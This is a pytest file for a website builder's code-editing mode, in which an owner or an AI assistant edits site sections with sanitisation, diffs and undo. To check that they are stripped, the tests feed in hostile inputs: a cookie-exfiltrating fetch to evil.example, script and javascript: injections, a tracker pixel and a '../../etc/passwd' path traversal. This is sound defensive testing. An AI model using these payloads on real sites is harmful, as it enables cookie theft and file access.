"""v0.367 CODE MODE (web design Phase 8, owner: "START PHASE 4"): her website's real code - every section's HTML / CSS /
script and the design kit - opened as files, edited by hand (cleaned like every build, one Undo, a checked version) or by
asking Hoola (Opus changes the code as a site job, a diff she sees, one Undo for the whole change), and exported."""
import re

import pytest

from tests.test_life import conv_ctx
from tests.test_v121_site import T, site_env  # noqa: F401  (fixture)


def _site(S):
    v = S.new(T, "mithai dukaan ki website", conv_ctx().conversation_id, name="Sharma Sweets",
              answers={"phone": "9876543210", "address": "Main Road, Akot"})
    S.approve_plan(T, v["id"], pages=["contact"])
    S.choose_look(T, v["id"], 0)
    return v["id"]


def test_readable_code_round_trips():
    from app.site import code as C
    css = ('#s-x .a{color:red;background:url("data:image/svg+xml;utf8,<svg>a;b</svg>")}'
           '@media (min-width:768px){#s-x .b{content:"x;y";padding:0}}')
    p = C.pretty_css(css)
    assert "  color:red;\n" in p and 'url("data:image/svg+xml;utf8,<svg>a;b</svg>");' in p and 'content:"x;y";' in p

    def norm(x):
        return re.sub(r"\s+", "", x).replace(";}", "}")
    assert norm(p) == norm(css)
    h = C.pretty_html('<section id="s-a" class="hs"><div class="wrap"><h2 data-e="1">Hi <a href="#">x</a></h2>'
                      '<ul><li>a</li><li>b</li></ul></div></section>')
    assert 'data-e' not in h and "<h2>Hi <a href=\"#\">x</a></h2>" in h and "<ul><li>a</li><li>b</li></ul>" in h   # inline kept
    assert C.bare_js("(function(){try{\nvar a=1;\n}catch(e){}})();") == "var a=1;\n"
    assert C.key_of("pages/home/hero.html") == ("home__hero", "html")
    with pytest.raises(C.CodeError):
        C.key_of("../../etc/passwd")


def test_files_hand_edits_safety_and_undo(site_env):
    from app.site import build as B
    from app.site import service as S
    sid = _site(S)
    t = S.code_tree(T, sid)
    paths = [f["path"] for g in t["files"] for f in g["files"]]
    assert "pages/home/hero.html" in paths and "pages/home/hero.css" in paths and paths[-1] == "design/kit.css"
    r = S.code_read(T, sid, "pages/home/hero.html")
    assert r["code"].startswith("<section") and 'id="s-home-hero"' in r["code"].split("\n")[0] and "data-e=" not in r["code"]
    ver = S.get(T, sid)["version"]
    new = r["code"].replace("</section>", '<p class="lead" onclick="steal()">Naya din, nayi mithai.</p>'
                            '<script>alert(1)</script><a href="javascript:x()">bad</a></section>')
    out = S.code_write(T, sid, "pages/home/hero.html", new)
    assert "Naya din, nayi mithai." in out["code"] and "onclick" not in out["code"] and "<script" not in out["code"]
    assert "javascript:" not in out["code"] and any("removed <script>" in x for x in out["removed"])
    assert "Safety ke liye hataya" in out["say"]
    g = S.get(T, sid)
    assert g["version"] == ver + 1
    assert "Naya din, nayi mithai." in (B.out_dir(T, sid, g["version"]) / "index.html").read_text()
    # css is scoped to the section; a script that reaches the network is refused
    css = S.code_write(T, sid, "pages/home/hero.css", ".lead { color: var(--c-primary); }\nbody { display:none }")["code"]
    assert "#s-home-hero .lead" in css and "\nbody" not in css and "#s-home-hero {" in css
    js = S.code_write(T, sid, "pages/home/hero.js", "fetch('https://evil.example/' + document.cookie)")
    assert js["code"] == "" and any("script" in x for x in js["removed"])
    ok = S.code_write(T, sid, "pages/home/hero.js", "document.getElementById('s-home-hero').classList.add('ready');")
    assert "classList.add('ready')" in ok["code"]
    # the design kit keeps only .k-* rules
    kit = S.code_write(T, sid, "design/kit.css", ".k-btn{border-radius:999px}\nh1{color:red}")
    assert ".k-btn" in kit["code"] and "h1" not in kit["code"]
    # Undo goes back one step at a time
    S.undo_edit(T, sid)
    assert "h1" not in S.code_read(T, sid, "design/kit.css")["code"] and ".k-btn{border-radius:999px}" not in \
        S.code_read(T, sid, "design/kit.css")["code"].replace(" ", "").replace("\n", "")
    S.undo_edit(T, sid)
    assert "classList" not in S.code_read(T, sid, "pages/home/hero.js")["code"]
    with pytest.raises(S.SiteError):
        S.code_read(T, sid, "pages/home/nope.html")


def test_ask_hoola_changes_code_with_a_diff(site_env, monkeypatch):
    from app.site import ai as AI
    from app.site import code as C
    from app.site import service as S
    seen = []

    def ask(system, prompt, max_tokens=6000, kind="build"):
        if system.startswith(C.CODE_SYSTEM[:40]):
            seen.append(prompt)
            import json
            files = json.loads(prompt.split("SECTIONS JSON:\n", 1)[1])
            f = files[0]
            html = f["html"].replace("</section>", '<table class="k-compare"><tr><th>Plan</th><th>Daam</th></tr>'
                                                     '<tr><td>Basic</td><td><em class="blank">[daam]</em></td></tr></table>'
                                                     '<img src="https://tracker.example/x.gif"></section>')
            return {"files": [{"key": f["key"], "html": html, "css": f["css"] + " .k-compare{width:100%}", "js": f["js"]},
                              {"key": "not__mine", "html": "<section>x</section>"}],
                    "summary": "3 plan ki table jod di"}
        return site_env(system, prompt, max_tokens, kind)
    monkeypatch.setattr(AI, "ask_json", ask)
    sid = _site(S)
    ver = S.get(T, sid)["version"]
    with pytest.raises(S.SiteError):
        S.code_ask(T, sid, "   ")
    out = S.code_ask(T, sid, "make the pricing table compare 3 plans", "pages/home/hero.html")
    assert out["status"] == "done", out                        # inline jobs in tests
    assert "SITE FACTS" in seen[0] and '"key": "home__hero"' in seen[0]
    assert "+<table class=\"k-compare\">" in out["diff"] or "k-compare" in out["diff"]
    assert out["files"] == ["pages/home/hero.html"] and "3 plan ki table jod di" in out["say"]
    assert any("external src" in x for x in out["removed"])                    # the tracker pixel never made it
    code = S.code_read(T, sid, "pages/home/hero.html")["code"]
    assert "k-compare" in code and "tracker.example" not in code
    assert "#s-home-hero .k-compare" in S.code_read(T, sid, "pages/home/hero.css")["code"]
    assert S.get(T, sid)["version"] == ver + 1
    assert S.code_task(T, sid, out["task"])["status"] == "done"
    with pytest.raises(S.SiteError):
        S.code_task(T, sid, "../../x")
    S.undo_edit(T, sid)                                                       # one Undo for the whole change
    assert "k-compare" not in S.code_read(T, sid, "pages/home/hero.html")["code"]
    # no file open: her words pick the section(s)
    keys = C.pick("contact page ka form bada karo", S._sections(S._load(sid)), lambda t: t)
    assert keys and keys[0].startswith("contact__")
    # Opus gave nothing usable -> said plainly, nothing changed
    monkeypatch.setattr(AI, "ask_json", lambda *a, **k: {"files": []})
    bad = S.code_ask(T, sid, "kuch bhi")
    assert bad["status"] == "failed" and "dobara" in bad["say"]


def test_api_tools_and_console():
    from pathlib import Path
    from app.agent import site_tools as ST
    tool = next(t for t in ST.SITE_TOOLS if t["name"] == "website")
    assert "code" in tool["input_schema"]["properties"]["action"]["enum"] and "CODE MODE" in tool["description"]
    dekho = next(t for t in ST.SITE_TOOLS if t["name"] == "website_dekho")
    assert "code" in dekho["input_schema"]["properties"]["what"]["enum"]
    con = Path(__file__).resolve().parents[1] / "app" / "static" / "console"
    js = (con / "build.js").read_text()
    assert "['code', 'Code']" in js and "loadCodeMode(o, ot)" in js and "/code/ask" in js and "/code/task/" in js
    css = (con / "v2.css").read_text()
    assert css.index(".stcode{") < css.index("/* ===== v0.288 SIDEBAR FULLY VISIBLE")


def test_owner_only(site_env):
    from fastapi.testclient import TestClient
    from app.main import app, current_tenant
    from app.site import service as S
    sid = _site(S)
    c = TestClient(app)
    assert c.get(f"/api/sites/{sid}/code").json()["files"]
    assert "<section" in c.get(f"/api/sites/{sid}/code", params={"path": "pages/home/hero.html"}).json()["code"]
    app.dependency_overrides[current_tenant] = lambda: "someone-else"
    try:
        assert c.get(f"/api/sites/{sid}/code").status_code in (400, 403, 404)
        assert c.put(f"/api/sites/{sid}/code", json={"path": "pages/home/hero.html", "code": "<section>x</section>"}).status_code in (400, 403, 404)
        assert c.post(f"/api/sites/{sid}/code/ask", json={"instruction": "x"}).status_code in (400, 403, 404)
    finally:
        app.dependency_overrides.pop(current_tenant, None)


def test_version():
    from pathlib import Path
    from app.main import APP_VERSION
    assert APP_VERSION == "0.367.0"
    assert "0.367.0+407" in (Path(__file__).resolve().parents[2] / "pubspec.yaml").read_text()
